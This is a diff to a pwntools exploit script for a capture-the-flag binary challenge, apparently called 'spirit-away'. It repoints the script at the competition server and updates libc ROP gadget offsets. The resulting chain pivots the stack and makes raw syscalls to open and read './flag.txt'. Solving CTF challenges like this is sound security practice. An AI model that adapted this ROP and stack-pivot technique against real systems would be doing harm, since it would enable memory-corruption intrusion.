@@ -2,9 +2,9 @@ from pwn import *
 from libnum import s2n, n2s
 from ctypes import CDLL
 
-elf = context.binary = ELF('./main_patched', checksec=False)
-libc = ELF('libc.so.6', checksec=False)
-cdll = CDLL('libc.so.6')
+elf = context.binary = ELF('../dist/main', checksec=False)
+libc = ELF('../dist/libc.so.6', checksec=False)
+cdll = CDLL('../dist/libc.so.6')
 context.update(
     log_level='debug'
 )
@@ -59,8 +59,8 @@ def decrypt(target:int):
     return s2n(b''.join(map(n2s,reversed(target))))
 
 
-# p = remote('103.181.183.216', 17010)
-p = remote('localhost', 49999)
+p = remote("ctf.tcp1p.com", 49999)
+# p = remote('localhost', 49999)
 # p = elf.process()
 
 # p = gdb.debug(['./spirit-away'], c)
@@ -127,19 +127,17 @@ log.info(f'{STACK:x}')
 order(0, b'./flag.txt\x00')
 
 # 2.37
-rax = libc.address + 0x0000000000040143
+rax = libc.address + 0x00000000000400f3
 rdi = libc.address + 0x00000000000240e5
 rsi = libc.address + 0x000000000002573e
 rdx = libc.address + 0x0000000000026302
-syscall = libc.address + 0x000000000008b9b6
-ret = libc.address + 0x0000000000022fd9
+syscall = libc.address + 0x000000000008bee6
 flag = HEAP_BASE + 0x1ef0
 rip = libc.address + 0x1f7ec0
-# rip = STACK - 0x1e1f8
-rsp = libc.address + 0x000000000002f0a1
+rsp = libc.address + 0x000000000002f081
 
 rop_part1 = flat(
-    ret,
+    rdi+1,
     rax,
     0x2,
     rsi,
@@ -223,7 +221,7 @@ c
 # rsp magic
 
 magic = flat(
-    ret,
+    rdi+1,
     rsp,
     rip,
 )
